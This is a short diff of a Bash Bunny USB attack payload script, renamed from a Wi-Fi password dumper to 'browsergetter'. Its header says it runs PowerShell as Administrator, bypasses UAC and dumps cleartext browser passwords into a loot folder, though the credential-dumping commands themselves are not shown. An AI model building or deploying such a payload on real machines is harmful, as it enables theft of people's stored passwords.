@@ -1,13 +1,13 @@
 #!/bin/bash
 #
-# Title:         WiPassDumpv2
+# Title:         browsergetter
 # Author:        greenwe333
-# Version:       2.0
+# Version:       1.0
 # Target:        Windows
 # 
 # Runs powershell as Administrator
 # Bypasses UAC
-# Dumps cleartext Wi-Fi passwords and infos to the Bash Bunny
+# Dumps cleartext browser passwords and infos to the Bash Bunny
 #
 # Source bunny_helpers.sh to get environment variable SWITCH_POSITION
 source bunny_helpers.sh
@@ -15,7 +15,7 @@ source bunny_helpers.sh
 LED R 100
 
 # Create directory to dump infos
-mkdir -p /root/udisk/loot/WiPassDump
+mkdir -p /root/udisk/loot/BrowserGetter
 
 
 LED R
